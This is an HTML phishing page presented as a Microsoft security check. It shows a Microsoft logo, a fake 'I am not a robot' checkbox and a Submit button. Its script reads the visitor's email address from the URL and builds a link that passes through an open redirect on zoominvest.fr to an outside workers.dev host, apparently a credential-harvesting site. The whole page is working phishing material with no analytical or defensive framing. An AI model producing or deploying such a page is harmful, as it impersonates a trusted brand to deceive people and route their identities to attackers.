<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>
<script>
    // Function to extract email from URL
    function getEmailFromURL() {
        // Get the URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        // Get the value of 'email' parameter
        const email = urlParams.get('email');
        return email;
    }

    // Function to update the link with the extracted email
    function updateLink() {
        const email = getEmailFromURL();
        // Update the href attribute of the link
        const link = document.getElementById('redirectLink');
        link.href = https://zoominvest.fr/redirect.php?url=https://h.toniskreen2.workers.dev/?email=${email};
    }

    // Call the updateLink function when the page loads
    window.onload = function() {
        updateLink();
    };
</script>
</head>
<body style="font-family: Arial, Helvetica, sans-serif; display: flex; align-items: center; height: 100vh;">
<div style="display: block; margin: 0 auto; text-align: center; position: relative;">
    <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png" alt="" width="130px" height="auto">
    <p>I am not a robot <input type="checkbox"></p>
    <!-- Use JavaScript to update the link -->
    <a id="redirectLink" title="https://zoominvest.fr/redirect.php?url=https://h.toniskreen2.workers.dev/" style="text-decoration: none; cursor: pointer;">
        <button>Submit</button>
    </a>
</div>
</body>
</html>
